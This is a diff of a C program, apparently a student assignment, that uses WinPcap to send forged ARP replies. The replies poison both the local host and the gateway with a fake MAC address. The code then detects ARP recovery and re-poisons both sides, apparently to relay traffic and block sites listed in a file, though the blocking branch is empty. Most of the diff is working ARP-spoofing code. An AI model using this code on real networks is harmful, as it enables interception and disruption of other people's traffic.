@@ -7,15 +7,33 @@
 #include <IPHlpApi.h>
 #pragma comment(lib, "iphlpapi.lib")
 
+#pragma HAVE_REMOTE
+#pragma WPCAP
+#ifndef WIN32
+#include <sys/socket.h>
+#include <netinet/in.h>
+#else
 #include <winsock.h>
 #include <winsock2.h>
 #include <WS2tcpip.h>
 
-int my_MACnIP(unsigned char* mac, unsigned char* ipadd) {
+#endif
+
+#define ETH_len 14
+#define IP_len 20
+#define TCP_len 20
+#define TCP_payload ETH_len+IP_len+TCP_len
+
+#define ETH_type 12
+#define IP_prot 9
+
+#define IP_chksum ETH_len+10
+#define TCP_chksum ETH_len+IP_len+16
+
+int my_MAC(unsigned char* mac) {
 	PIP_ADAPTER_INFO info, pinfo=NULL;
 	DWORD size = sizeof(info);
 	int success=0;
-	int chk, cnt;
 
 	info = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
 	if (info == NULL) {
@@ -36,9 +54,39 @@ int my_MACnIP(unsigned char* mac, unsigned char* ipadd) {
 	}
 	if (success) {
 		memcpy(mac, pinfo->Address, 6);
+	}
+
+	free(info);
+	return success;	// success 1 , fail 0
+}
+
+int my_IP(unsigned char* ipadd) {
+	PIP_ADAPTER_INFO info, pinfo = NULL;
+	DWORD size = sizeof(info);
+	int success = 0;
+	int chk, cnt;
+
+	info = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
+	if (info == NULL) {
+		printf("Error in allocating info\n");
+	}
+
+	if (GetAdaptersInfo(info, &size) == ERROR_BUFFER_OVERFLOW) {
+		info = (IP_ADAPTER_INFO *)malloc(size);
+		if (info == NULL) {
+			printf("Error in allocating info\n");
+		}
+	}
+	if (GetAdaptersInfo(info, &size) == NO_ERROR) {
+		pinfo = info;
+		if (pinfo) {
+			success = 1;
+		}
+	}
+	if (success) {
 		chk = 0;
 		cnt = 0;
-		for(int i=0;i<strlen(pinfo->IpAddressList.IpAddress.String);i++){
+		for (int i = 0; i<strlen(pinfo->IpAddressList.IpAddress.String); i++) {
 			if (pinfo->IpAddressList.IpAddress.String[i] == '.') {
 				ipadd[cnt] = chk;
 				chk = 0;
@@ -98,13 +146,13 @@ int gateway_IP(unsigned char* gip) {
 	return success;	// success 1 , fail 0
 }
 
-
 // copied from my arp_poison
 int make_request(u_char* pdata, u_char* tip) {
 	int i;
+	// broadcast
 	for (i = 0; i<6; i++)
 		pdata[i] = 0xFF;
-	if (eth0_MAC(&pdata[6]) == 0) {
+	if (my_MAC(&pdata[6]) == 0) {
 		printf("Error : Writing my MAC! \n");
 		return 0;
 	}
@@ -119,8 +167,12 @@ int make_request(u_char* pdata, u_char* tip) {
 	pdata[20] = 0x00;
 	pdata[21] = 0x01; // request
 
-	if (my_MACnIP(&pdata[22],&pdata[28]) == 0) {
-		printf("Error : Writing my IP and MAC! \n");
+	if (my_MAC(&pdata[22]) == 0) {
+		printf("Error : Writing my MAC! \n");
+		return 0;
+	}
+	if (my_IP(&pdata[28]) == 0) {
+		printf("Error : Writing my IP! \n");
 		return 0;
 	}
 	for (i = 0; i<6; i++)
@@ -133,30 +185,38 @@ int make_request(u_char* pdata, u_char* tip) {
 }
 
 // copied from my arp_poison
-int make_sp_target(u_char* arp_data, u_char* targetip, u_char* req_data) {
+int make_sp_me(u_char* arp_data, u_char* targetip, u_char* req_data) {
 	int i;
 
-	// source MAC (6-11)
-	if (eth0_MAC(&arp_data[6]) == 0) {
+	// fake source mac (aa:aa:aa:aa:aa:aa)
+	for (i = 6; i < 12; i++) {
+		arp_data[i] = 'a';
+	}
+	// fake sender mac
+	for (i = 22; i < 28; i++) {
+		arp_data[i] = 'a';
+	}
+
+	// dst MAC (6-11) sender MAC (22-27)
+	if (my_MAC(&arp_data[0]) == 0) {
 		printf("Error : Writing my MAC address at packet ! \n");
 	}
-	// sender MAC (22-27)
-	if (eth0_MAC(&arp_data[22]) == 0) {
-		printf("Error : Writing my MAC address at packet ! \n");
+	// fake mac (aa:aa:aa:aa:aa:aa)
+	for (i = 6; i < 12; i++) {
+		arp_data[i] = 'a';
 	}
 	// sender IP (28-31)  --  fake to victim
-	if (gatewayIP(&arp_data[28]) == 0) {
+	if (gateway_IP(&arp_data[28]) == 0) {
 		printf("Error : Can't read gateway address! \n");
 	}
+	// target MAC (me)
+	my_MAC(&arp_data[32]);
+
 	// target ip (38-41)
 	for (i = 0; i<4; i++) {
 		arp_data[38 + i] = targetip[i];
 	}
 
-	// generating ARP request for ask victim's MAC
-	if (make_request(req_data, targetip) == 0) {
-		printf("Error : Making Request \n");
-	}
 	return 1;
 }
 
@@ -164,8 +224,16 @@ int make_sp_target(u_char* arp_data, u_char* targetip, u_char* req_data) {
 int make_sp_router(u_char* arp_data, u_char* targetip, u_char* req_data) {
 	int i;
 
+	// fake source mac (aa:aa:aa:aa:aa:aa)
+	for (i = 6; i < 12; i++) {
+		arp_data[i] = 'a';
+	}
+	// fake sender mac
+	for (i = 22; i < 28; i++) {
+		arp_data[i] = 'a';
+	}
 	// target ip (38-41)
-	if (gatewayIP(&arp_data[38]) == 0) {
+	if (gateway_IP(&arp_data[38]) == 0) {
 		printf("Error : Can't read gateway address! \n");
 	}
 	// sender IP (28-31)  --  fake to router
@@ -185,7 +253,33 @@ int main(int argc, char* argv[]) {
 	FILE* fp;
 	char* block[100][100];
 	int i,len=0;
+	const int snaplen = 65536;
+
+	u_char arp_data[42] = { 0, };
+	u_char arp_data_r[42] = { 0, };
 	u_char req_data[42] = { 0, };
+	u_char targetip[4];
+	u_char gatewip[4];
+	u_char relaying_data[65536];
+
+	pcap_if_t *alldevs;
+	pcap_if_t *d;
+	int inum;
+	pcap_t *adhandle;
+	int res;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	struct tm ltime;
+	char timestr[16];
+	struct pcap_pkthdr *header;
+	const u_char* pkt_data;
+	u_char block_data[ETH_len + IP_len + TCP_len + 8];
+	time_t local_tv_sec;
+	int count_reinfect = 0; // counter for check if they know that they are poisoned
+
+	u_char myMAC[6];
+	u_char gatewayMAC[6]; // setting at line 373
+
+	my_MAC(myMAC);
 
 	// reading mal_site.txt
 	fopen_s(&fp, "mal_site.txt", "r");
@@ -194,16 +288,174 @@ int main(int argc, char* argv[]) {
 	}
 	fclose(fp);
 
-	my_MACnIP(&req_data[0], &req_data[6]);
-	gateway_IP(&req_data[10]);
-	for (i = 0; i < 6; i++) {
-		printf("%02x ", req_data[i]);
+	/* Retrieve the device list on the local machine */
+	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
+	{
+		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
+		exit(1);
 	}
-	printf("\n");
-	for (i = 0; i < 8; i++) {
-		printf("%d.", req_data[6 + i]);
+	inum = 1;	// first device select
+
+	/* Jump to the selected adapter */
+	for (d = alldevs, i = 0; i< inum - 1; d = d->next, i++);
+
+	/* Open the device */
+	if ((adhandle = pcap_open(d->name,          // name of the device
+		65536,            // portion of the packet to capture. 
+						  // 65536 guarantees that the whole packet will be captured on all the link layers
+		PCAP_OPENFLAG_PROMISCUOUS,    // promiscuous mode
+		1,             // read timeout
+		NULL,             // authentication on the remote machine
+		errbuf            // error buffer
+	)) == NULL)
+	{
+		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
+		/* Free the device list */
+		pcap_freealldevs(alldevs);
+		return -1;
 	}
-	printf("\n");
+
+	// Fixed Packet (ARP, type reply, ...)
+
+	// type (ARP = 0x0806)
+	arp_data[12] = 0x08;
+	arp_data[13] = 0x06;
+	// Ethernet = 0x0001
+	arp_data[14] = 0x00;
+	arp_data[15] = 0x01;
+	// IP = 0x0800
+	arp_data[16] = 0x08;
+	arp_data[17] = 0x00;
+	// MAC length (06)
+	arp_data[18] = 0x06;
+	// IP length (04)
+	arp_data[19] = 0x04;
+	// ARP type ( reply = 0x0002 )
+	arp_data[20] = 0x00;
+	arp_data[21] = 0x02;
+
+	
+	my_IP(&arp_data[28]);
+
+////////////////////////////////////////////////////////////////////////////////
+
+	gateway_IP(gatewip);
+	// I am target
+	my_IP(targetip);
+	memcpy(arp_data_r, arp_data, 42);
+	make_sp_me(arp_data, targetip, req_data);
+
+// router spoofing ////////////////////////////////////////////////////////////
+
+	make_sp_router(arp_data_r, targetip, req_data);
+
+	// send ARP request to victim (broadcast)
+	if (pcap_sendpacket(adhandle, req_data, 42) != 0) {
+		printf("Error : Sending request packet!\n");
+	}
+	// catch arp relay packet
+	while ((res = pcap_next_ex(adhandle, &header, &pkt_data)) >= 0) {
+		if (res == 0)
+			/* Timeout elapsed */
+			continue;
+
+		// type check
+		if (ntohs(*((unsigned short*)(&pkt_data[12]))) != 0x0806) {
+			// it's not ARP
+			continue;
+		}
+		else { // It's ARP !
+			if (ntohs(*((unsigned short*)(&pkt_data[20]))) == 0x0002) {
+				if (((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)(&req_data[38]))[0]) {
+					for (i = 0; i<6; i++) {
+						arp_data_r[i] = pkt_data[6 + i];
+						arp_data_r[32 + i] = pkt_data[6 + i];
+						gatewayMAC[i] = pkt_data[6 + i];
+					}
+					break;
+				}
+			}
+		}
+	}
+	if (res == -1) {
+		printf("Error reading the packets: %s\n", pcap_geterr(adhandle));
+		return -1;
+	}
+
+	if (pcap_sendpacket(adhandle, arp_data, 42) != 0) {
+		printf("Error : Sending request packet!\n");
+	}
+
+	printf("Spoofing me Finished\n");
+
+	// send ARP spoofing packet
+	if (pcap_sendpacket(adhandle, arp_data_r, 42) != 0) {
+		printf("Error : Sending request packet!\n");
+	}
+	
+	printf("Spoofing router Finished\n");
+
+//////////////////////////////////////////////////////////////////////////////////////////
+
+// 위의 내용은 이전 과제를 windows에 맞게 살짝 수정한 내용입니다.
+// 또한 감염 타겟을 자기자신으로 고정시켰습니다.
+// router knows that my MAC is aa:aa:aa:aa:aa:aa
+// my computer knows that router MAC is aa:aa:aa:aa:aa:aa
+
+
+	// relay and re-infecting and blocking mal site
+	while ((res = pcap_next_ex(adhandle, &header, &pkt_data)) >= 0) {
+		if (res == 0)
+			/* Timeout elapsed */
+			continue;
+		if (count_reinfect > 5) {
+			count_reinfect = 0;
+			if (pcap_sendpacket(adhandle, arp_data, 42) != 0) {
+				printf("Error : Sending arp spoofing packet to victim !\n");
+			}
+			if (pcap_sendpacket(adhandle, arp_data_r, 42) != 0) {
+				printf("Error : Sending arp spoofing packet to router !\n");
+			}
+			printf("Spoofing Victim and Router again Finished\n");
+		}
+
+		// re-infecting ( copied from my arp_poison assignment )
+		if (ntohs(*((unsigned short*)(&pkt_data[12]))) == 0x0806) {
+			count_reinfect++; // if arp packet is increased, then router and victim smell the spoofing
+							  // if arp -> check for recognizing it is arp recovery
+			if (ntohs(*((unsigned short*)(&pkt_data[20]))) == 0x0002) { // reply
+																		// sender ip = victim ip ?
+				if ((((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)targetip)[0])) {
+					// target ip = router ?
+					//if( ( ((unsigned int*)(&pkt_data[38]))[0] == ((unsigned int*)gatewip)[0] ) ){
+					// !! target is recovering router !!
+					printf("Detected Recovering Router\n");
+					if (pcap_sendpacket(adhandle, arp_data_r, 42) != 0) {
+						printf("Error : Sending arp spoofing packet to router !\n");
+					}
+					printf(" -> Spoofing Router again Finished\n");
+					//}
+				}
+				// sender ip = router ip ?
+				else if ((((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)gatewip)[0])) {
+					// target ip = victim ip ?
+					// !! target is recovering victim !!
+					printf("Detected Recovering Victim\n");
+					if (pcap_sendpacket(adhandle, arp_data, 42) != 0) {
+						printf("Error : Sending arp spoofing packet to victim !\n");
+					}
+					printf(" -> Spoofing Victim again Finished\n");
+				}
+			}
+		}
+
+		// relaying and blocking mal_site
+		else {
+			// if source mac is aa:aa:aa:aa:aa:aa
+			
+		}
+	}
+
 
 //	system("pause");
 	return 0;
